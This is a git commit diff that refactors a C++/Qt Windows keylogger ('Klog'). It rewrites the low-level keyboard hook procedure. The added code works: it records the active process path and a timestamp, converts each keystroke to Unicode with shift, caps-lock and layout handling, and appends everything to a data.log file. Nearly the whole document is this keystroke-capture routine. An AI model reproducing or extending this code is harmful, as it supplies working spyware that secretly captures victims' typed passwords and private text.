6f09107a275949a1201a0f1622051cbba5bfabe0
Unknown <djg2008@gmail.com>
2018-07-10 00:19:44 +0300

    Removed duplicate code (get process path)
    * Moved class variables definition to initializer list

--- src/includes/klog.cpp
+++ src/includes/klog.cpp
@@ -17,17 +17,18 @@ void Klog::setParameters(const bool &work, const int &seconds)
 
 void Klog::setPath(const QString &newPath)
 {
-    //Create log file
     path = newPath;
-    logFile = std::make_unique<QFile>(path + "/data.log");
+    logFile->setFileName(path + "/data.log");
 }
 
 Klog::Klog(QObject *parent) :
     QObject(parent),
     isWorking(true),
-    currProcess()
+    currProcess(),
+    path(),
+    timer(std::make_unique<QTimer>(this)),
+    logFile(std::make_unique<QFile>(this))
 {
-    timer = std::make_unique<QTimer>(this);
     connect(timer.get(), &QTimer::timeout, this, &Klog::timerIsUp);
 
     HINSTANCE hInstance = GetModuleHandle(NULL);
@@ -44,139 +45,133 @@ Klog::Klog(QObject *parent) :
 
 LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-    //If Keylogger is ON
-    if (Klog::instance().isWorking)
+    auto& klog = Klog::instance();
+    //If Keylogger is ON && key is pressed
+    if (Klog::instance().isWorking && wParam == WM_KEYDOWN)
     {
-        // If key is pressed
-        if (wParam == WM_KEYDOWN)
+        //Open log file
+        if ( ! klog.logFile->open(QIODevice::Append | QIODevice::Text))
         {
-            //Open log file
-            if ( ! Klog::instance().logFile->open(QIODevice::Append | QIODevice::Text) )
-                qDebug () << "Cannot create log file";
-
-            QTextStream log(Klog::instance().logFile.get());
-
-            //Get process ID and thread ID
-            DWORD processId;
-            GUITHREADINFO gti;
-            ZeroMemory(&gti, sizeof(GUITHREADINFO));
-            gti.cbSize = sizeof(GUITHREADINFO);
-            GetGUIThreadInfo(0, &gti);
-            DWORD threadId = GetWindowThreadProcessId(gti.hwndActive, &processId);
-
-            //Get process handle
-            HANDLE handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
-            TCHAR procPath[MAX_PATH];
-
-            //Get process path
-            if (GetModuleFileNameEx(handle, 0, procPath, MAX_PATH))
-            {
-                //If process name has changed
-                QString& prevProc = Klog::instance().currProcess;
-                QString currProc = QString::fromWCharArray((LPTSTR)procPath);
-                if (currProc != prevProc)
-                {
-                    //Write process name and time to log
-                    log << "\n\n" << currProc << "\t" << QDateTime::currentDateTime().toString("hh:mm:ss dd.MM.yyyy") << "\n";
-                    Klog::instance().currProcess = QString::fromWCharArray(procPath);
-                }
-            }
-            //For 64-bit programs
-            else if (GetProcessImageFileName(handle, procPath, MAX_PATH))
-            {
-                //Get path in device form
-                QString devicePath( QString::fromWCharArray((LPTSTR)procPath) );
-
-                //Transform device form path to drive letters
-                TCHAR driveLetter = 'A';
-                TCHAR szTarget[512] = {0};
-                while(driveLetter <= 'Z')
-                {
-                    TCHAR szDeviceName[3] = {driveLetter, ':', '\0'};
-                    //szTarget[512] = {0};
-                    //Get drive letters of device names
-                    if(QueryDosDevice(szDeviceName, szTarget, 511) != 0)
-                    {
-                        if(wcsncmp(procPath, szTarget, wcslen(szTarget)) == 0)
-                            break;
-                    }
-                    driveLetter++;
-                }
-
-                //Replace device name with drive letter
-                devicePath.replace(0, wcslen(szTarget), (QChar)driveLetter + ':');
-
-                //If process name has changed
-                QString& prevProc = Klog::instance().currProcess;
-                QString& currProc = devicePath;
-                if (currProc != prevProc)
-                {
-                    //Write process name and time to log
-                    log << "\n\n" << currProc << "\t" << QDateTime::currentDateTime().toString("hh:mm:ss dd.MM.yyyy") << "\n";
-                    Klog::instance().currProcess = currProc;
-                }
-
-            }
-
-            CloseHandle(handle);
-
-            //KBDLLHOOKSTRUCT  contains information about a low-level keyboard input event:
-            //vkCode, scanCode, flags, time, dwExtraInfo
-            KBDLLHOOKSTRUCT*  kbdHook = (KBDLLHOOKSTRUCT*) (lParam);
-
-            //Print keys
-            switch (kbdHook->vkCode) {
-                case VK_DELETE:
-                    log << "<DEL>";
-                    break;
-                case VK_BACK:
-                    log << "<BACK>";
-                    break;
-                case VK_RETURN:
-                    log << "\n";
-                    break;
-                case VK_LCONTROL:
-                case VK_RCONTROL:
-                    log << "<CTRL>";
-                    break;
-
-                case VK_CAPITAL:    break;
-                case VK_LSHIFT:     break;
-                case VK_RSHIFT:     break;
-                case VK_INSERT:		break;
-                case VK_END:		break;
-                case VK_PRINT:		break;
-
-                case VK_LEFT:		break;
-                case VK_RIGHT:		break;
-                case VK_UP:			break;
-                case VK_DOWN:		break;
-
-                //Visible keys
-                default:
-
-                //Check Shift and CapsLock state
-                bool isDownShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
-                bool isDownCapslock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
-                bool isDownCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
-
-                BYTE kbdState[256];
-                wchar_t buff[4];
-
-                GetKeyboardState(kbdState);
-                if (isDownShift) kbdState[16] = 0x80;
-                if (isDownCapslock) kbdState[20] = 0x01;
-                if (isDownCtrl) kbdState[17] = 0x00;
-
-                //Get keyboard layout for current thread
-                HKL kbdLayout = GetKeyboardLayout(threadId);
-                //Translate virtual-key code  to the corresponding Unicode character.
-                ToUnicodeEx(kbdHook->vkCode, kbdHook->scanCode, kbdState, buff, _countof(buff), 0, kbdLayout);
-
-                log << QString::fromWCharArray(buff);
-            }
-            Klog::instance().logFile->close();
+            qDebug () << "Cannot open log file";
+            return CallNextHookEx(NULL, nCode, wParam, lParam);
         }
+
+        QTextStream log(klog.logFile.get());
+
+        //Get process ID and thread ID
+        DWORD processId;
+        GUITHREADINFO gti;
+        ZeroMemory(&gti, sizeof(GUITHREADINFO));
+        gti.cbSize = sizeof(GUITHREADINFO);
+        GetGUIThreadInfo(0, &gti);
+        DWORD threadId = GetWindowThreadProcessId(gti.hwndActive, &processId);
+
+        //Get process handle
+        HANDLE handle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+        TCHAR procPath[MAX_PATH];
+
+        //Get process path
+        QString currProc;
+        if (GetModuleFileNameEx(handle, 0, procPath, MAX_PATH))
+        {
+            currProc = QString::fromWCharArray((LPTSTR)procPath);
+        }
+        //Second variant (64-bit)
+        else if (GetProcessImageFileName(handle, procPath, MAX_PATH))
+        {
+            //Get path in device form
+            QString devicePath(QString::fromWCharArray((LPTSTR)procPath));
+
+            //Transform device form path to drive letters
+            TCHAR driveLetter = 'A';
+            TCHAR szTarget[512] = {0};
+            while(driveLetter <= 'Z')
+            {
+                TCHAR szDeviceName[3] = {driveLetter, ':', '\0'};
+                //Get drive letters of device names
+                if(QueryDosDevice(szDeviceName, szTarget, 511) != 0)
+                {
+                    if(wcsncmp(procPath, szTarget, wcslen(szTarget)) == 0)
+                        break;
+                }
+                driveLetter++;
+            }
+
+            //Replace device name with drive letter
+            devicePath.replace(0, wcslen(szTarget), (QChar)driveLetter + ':');
+            currProc = devicePath;
+        }
+
+        //If process name has changed
+        QString& prevProc = klog.currProcess;
+        if (currProc != prevProc)
+        {
+            //Write process name and time to log
+            log << "\n\n" << currProc << "\t" << QDateTime::currentDateTime().toString("hh:mm:ss dd.MM.yyyy") << "\n";
+            klog.currProcess = currProc;
+        }
+
+        CloseHandle(handle);
+
+        //KBDLLHOOKSTRUCT  contains information about a low-level keyboard input event:
+        //vkCode, scanCode, flags, time, dwExtraInfo
+        KBDLLHOOKSTRUCT*  kbdHook = (KBDLLHOOKSTRUCT*) (lParam);
+
+        //Print keys
+        switch (kbdHook->vkCode) {
+            case VK_DELETE:
+                log << "<DEL>";
+                break;
+            case VK_BACK:
+                log << "<BACK>";
+                break;
+            case VK_RETURN:
+                log << "\n";
+                break;
+            case VK_LCONTROL:
+                [[fallthrough]];
+            case VK_RCONTROL:
+                log << "<CTRL>";
+                break;
+
+            case VK_CAPITAL:
+            case VK_LSHIFT:
+            case VK_RSHIFT:
+            case VK_INSERT:
+            case VK_END:
+            case VK_PRINT:
+            //Arrows
+            case VK_LEFT:
+            case VK_RIGHT:
+            case VK_UP:
+            case VK_DOWN:
+                break;
+
+            //Visible keys
+            default:
+
+            //Check Shift and CapsLock state
+            bool isDownShift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+            bool isDownCapslock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+            bool isDownCtrl = (GetKeyState(VK_CONTROL) & 0x8000) != 0;
+
+            BYTE kbdState[256];
+            wchar_t buff[4];
+
+            GetKeyboardState(kbdState);
+            if (isDownShift) kbdState[16] = 0x80;
+            if (isDownCapslock) kbdState[20] = 0x01;
+            if (isDownCtrl) kbdState[17] = 0x00;
+
+            //Get keyboard layout for current thread
+            HKL kbdLayout = GetKeyboardLayout(threadId);
+            //Translate virtual-key code to the corresponding Unicode character
+            ToUnicodeEx(kbdHook->vkCode, kbdHook->scanCode, kbdState, buff, _countof(buff), 0, kbdLayout);
+
+            //Write to log
+            log << QString::fromWCharArray(buff);
+        }
+        klog.logFile->close();
     }
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
